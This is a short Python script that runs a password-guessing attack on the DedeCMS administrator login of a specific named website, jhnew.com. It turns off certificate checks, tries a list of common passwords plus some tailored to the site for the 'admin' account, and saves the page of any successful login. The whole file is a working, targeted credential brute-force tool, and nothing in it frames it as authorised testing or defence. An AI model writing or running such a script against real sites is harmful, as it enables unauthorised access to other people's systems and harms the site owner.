#!/usr/bin/env python3
"""jhnew DedeCMS login via https+www - proper flow with cookies"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "keep-alive"}
HOST = "https://www.jhnew.com"

def get_opener():
    ctx = urllib.request.ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = urllib.request.ssl.CERT_NONE
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

PWS = ["admin", "admin123", "123456", "admin888", "dedecms", "admin@123", "12345678",
       "a123456", "admin666", "admin123456", "password", "888888", "admin000",
       "123456789", "jhnew", "gushiwen", "admin2024", "123456a"]

op, cj = get_opener()
code, final, body = fetch(op, HOST + "/admin/login.php")
print("GET: %s size=%d cookies=%d" % (code, len(body), len(cj)), flush=True)

for pw in PWS:
    data = urllib.parse.urlencode({"gotopage": "/admin/", "dopost": "login", "adminstyle": "newdedecms",
                                   "userid": "admin", "pwd": pw})
    code, final, body = fetch(op, HOST + "/admin/login.php", data=data, referer=HOST + "/admin/login.php")
    ok = ("退出" in body or "logout" in body.lower() or "系统" in body and "管理" in body
          or "index_body" in body.lower() or "admin_top" in body.lower())
    print("admin/%s: code=%s final=%s ok=%s size=%d" % (pw, code, final[:60], ok, len(body)), flush=True)
    if ok:
        print("!!! HIT admin/%s" % pw, flush=True)
        open("/tmp/jhnew_hit.html", "w").write(body)
        break
